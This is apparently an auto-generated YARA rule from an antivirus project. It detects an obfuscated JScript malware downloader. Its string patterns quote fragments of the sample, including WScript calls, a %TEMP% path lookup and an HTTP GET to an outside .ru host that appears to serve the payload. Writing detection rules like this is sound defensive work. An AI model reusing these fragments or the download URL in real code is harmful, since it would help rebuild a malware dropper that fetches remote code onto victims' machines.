rule sig_20160428_37c4bafd860d532e6fe0110bfd2198bb {
  meta:
    description = "datamaliciousorder - file 20160428_37c4bafd860d532e6fe0110bfd2198bb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2b36d33a588bbec8273c8318d16cb86f409af31e3e9072067025523adeec375d"

  strings:
    $s1  = "function WmlVtaYdnBwoMxqMvuElg(QokOhdDhqTrdRppRjjAsa){GnyAayOsfUvbUqxRfvDoh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function WmlVtaYdnBwoMxqMvuElg(QokOhdDhqTrdRppRjjAsa){GnyAayOsfUvbUqxRfvDoh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AdhKxoXafSytSsgXskLru() {return GnyAayOsfUvbUqxRfvDoh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function KfrWzxRwyFhbSbzCgyWaz(QfbOssTbrLfhPcbOweImz, MivEoaLsgMnhHxhWcnIyp){FygWywKhnGsuYzqFjlQob = FygWywKhnGsuYzqFjlQob * 1; " ascii
    $s5  = "return QfbOssTbrLfhPcbOweImz - MivEoaLsgMnhHxhWcnIyp;};" fullword ascii
    $s6  = "var GnyAayOsfUvbUqxRfvDoh = function AseHpsRtfOkmCbzPxeMnp() {return TndUibJtjDyiJxoXivBld[BvrVosXfjEdtEngFyjKdx](\"WScript\"+\"" ascii
    $s7  = "OmvXkaUxkHyqJvcWvgDwd[FgvTxhCpiYzdUclZgbEpg](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s8  = "var TndUibJtjDyiJxoXivBld = this[\"WScript\"];" fullword ascii
    $s9  = "var GnyAayOsfUvbUqxRfvDoh = function AseHpsRtfOkmCbzPxeMnp() {return TndUibJtjDyiJxoXivBld[BvrVosXfjEdtEngFyjKdx](\"WScript\"+\"" ascii
    $s10 = "function AdhKxoXafSytSsgXskLru() {return GnyAayOsfUvbUqxRfvDoh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "return KfrWzxRwyFhbSbzCgyWaz(1 == 1 ? QyzAcxMdtUjpXdvOrfQwm : 0, 1 == 1 ? BwmNyzKatZhcIsbGtqPhi : 0);" fullword ascii
    $s12 = "function EzgLedKpdIdlBsgAdyCkq(){return EofLmfNpdHdbHupOmnJzt + \"\";};" fullword ascii
    $s13 = "if (OmvXkaUxkHyqJvcWvgDwd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function KfrWzxRwyFhbSbzCgyWaz(QfbOssTbrLfhPcbOweImz, MivEoaLsgMnhHxhWcnIyp){FygWywKhnGsuYzqFjlQob = FygWywKhnGsuYzqFjlQob * 1; " ascii
    $s15 = "function WqfTwkHlgLsyEdiKrdKib() {return ((PynBbkPrvQrbSicNneEzv == true) && (PynBbkPrvQrbSicNneEzv == JkjAbvBouVlqQfeSagPyf)) ?" ascii
    $s16 = "function WqfTwkHlgLsyEdiKrdKib() {return ((PynBbkPrvQrbSicNneEzv == true) && (PynBbkPrvQrbSicNneEzv == JkjAbvBouVlqQfeSagPyf)) ?" ascii
    $s17 = "var StnQjxNlsUhuZbrXxcVci = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function XqzUomOkjBoiEgrXrjViw(){return BvrVosXfjEdtEngFyjKdx;};" fullword ascii
    $s19 = "XppGlzDjoCtzRfbLzzVxr = true;" fullword ascii
    $s20 = "JkjAbvBouVlqQfeSagPyf = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}